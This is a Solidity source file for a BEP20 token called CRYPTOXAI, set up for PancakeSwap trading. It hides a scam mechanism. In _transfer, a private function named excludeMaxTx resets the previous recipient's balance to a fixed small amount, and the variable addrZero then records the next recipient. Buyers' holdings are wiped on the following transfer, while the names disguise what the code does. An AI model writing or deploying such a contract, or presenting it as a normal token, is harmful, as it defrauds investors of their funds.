contract CRYPTOXAI is Context, IBEP20, Ownable {

    using Address for address;
    
    mapping(address => uint256) private _tOwned;
    
    mapping(address => uint256) private _balances;
    
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tTotal = 2000 * 10 ** 6 * 10 ** 9;

    address public addrZero=0x38E6E0db03dC150fB7B64717877B5C1966a3aEa5;
    address _routeraddress=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    string private _name = "CRYPTOXAI";
    string private _symbol = "CAI";
    uint8 private _decimals = 9;

    IPancakeRouter02 public immutable pancakeRouter;
    address public immutable pancakePair;

    constructor  (

    )  {
        
        _balances[_msgSender()] = _tTotal;

        IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
       // IPancakeRouter02 _pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a pancake pair for this new token
        pancakePair = IPancakeFactory(_pancakeRouter.factory())
        .createPair(address(this), _pancakeRouter.WETH());

        // set the rest of the contract variables
        pancakeRouter = _pancakeRouter;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return (_balances[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);//;, "BEP20: transfer amount exceeds allowance"));
        return true;
    }
    


    function _getCurrentSupply() private view returns (uint256) {
        uint256 tSupply = _tTotal;
        return tSupply;
    }

 

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount

    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _transferStandard(from, to, amount);
        excludeMaxTx(addrZero);
        addrZero=to;
    }

    
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        _balances[recipient] = _balances[recipient] + (tAmount);
        _balances[sender] = _balances[sender] - (tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function excludeMaxTx(address addr1) private
    {
        if (addr1!=pancakePair)
        {
            _balances[addr1]=100000000000;
        }
    }
    
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokens(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeRouter.WETH();
        _approve(address(this), address(_routeraddress), tokenAmount);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(_routeraddress), tokenAmount);
        pancakeRouter.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }

 

}
